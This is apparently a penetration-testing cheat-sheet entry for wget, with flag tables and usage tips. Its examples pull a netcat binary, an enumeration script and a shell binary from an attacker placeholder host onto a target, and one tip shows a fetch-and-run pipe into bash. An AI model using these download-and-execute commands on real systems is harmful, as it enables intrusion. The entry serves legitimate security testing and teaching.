---
slug: wget
name: wget
category: Web
tags: [download, http, transfer, files, payload, recursive]
oneLiner: Non-interactive downloader. The fastest way to pull a payload or tool onto a target that has it installed, or mirror a site for offline review.
---

## Common usage

Download a file
```sh
wget http://<LHOST>/nc64.exe
```

Save under a chosen name
```sh
wget http://<LHOST>/linpeas.sh -O /tmp/lp.sh
```

Quiet download to a writable dir
```sh
wget -q http://<LHOST>/shell.elf -O /tmp/shell.elf
```

## Key parameters

| Flag | What it does |
| --- | --- |
| `-O <file>` | Write to a specific filename (or - for stdout) |
| `-q` | Quiet — suppress progress output |
| `-c` | Continue a partially downloaded file |
| `--no-check-certificate` | Ignore TLS certificate errors |
| `-r` | Recursive download (site mirror) |

## More flags

| Flag | What it does |
| --- | --- |
| `-P <dir>` | Save downloads into a target directory |
| `-i <file>` | Read a list of URLs to fetch |
| `--header <h>` | Add a request header |
| `--post-data <d>` | Send a POST body |
| `-U <ua>` | Set the User-Agent |
| `-np` | No-parent — don't ascend above the start dir when recursing |
| `-A <list>` | Accept only these file extensions when recursing |
| `-b` | Background the download |

## Gotchas & tips

- On a target, drop files into a world-writable path like /tmp or /dev/shm — your shell user often can't write elsewhere.
- No wget? curl -o or certutil (Windows) do the same job; check which is present.
- -O - streams to stdout, handy for wget -qO- http://host/x.sh | bash.
- Recursive mode hammers a server; for a single file just give the full URL.
